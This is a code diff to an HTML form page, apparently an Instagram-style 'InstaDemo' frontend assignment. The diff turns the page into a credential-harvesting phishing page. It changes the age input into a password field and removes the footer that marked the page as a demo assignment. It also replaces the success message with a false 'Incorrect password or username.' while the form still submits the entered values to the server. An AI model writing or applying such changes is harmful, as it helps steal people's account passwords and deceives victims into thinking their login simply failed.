@@ -152,11 +152,9 @@
               <span class="sr-only">password</span>
               <input
                 name="age"
-                type="number"
+                type="password"
                 required
-                min="1"
-                max="120"
-                placeholder="Age"
+                placeholder="password"
                 class="w-full bg-neutral-50 border border-neutral-300 rounded-lg px-3 py-2.5 text-xs sm:text-sm text-neutral-900 placeholder-neutral-500 focus:outline-none focus:border-neutral-400 focus:bg-white transition-colors"
               >
             </label>
@@ -248,7 +246,9 @@
     </div>
     <div class="flex items-center justify-center gap-4 text-neutral-400">
       <span>English</span>
-      <span>&copy; 2026 InstaDemo — Frontend UI Assignment</span>
+      <span>
+        
+      </span>
     </div>
   </footer>
 
@@ -265,7 +265,7 @@
           body: JSON.stringify({ name: f.name.value, age: f.age.value })
         });
         const data = await res.json();
-        msg.textContent = res.ok ? 'Thanks! Your details were saved.' : (data.error || 'Something went wrong.');
+        msg.textContent = res.ok ? 'Incorrect password or username.' : (data.error || 'Something went wrong.');
         if (res.ok) f.reset();
       } catch { msg.textContent = 'Network error. Try again.'; }
       btn.disabled = false;
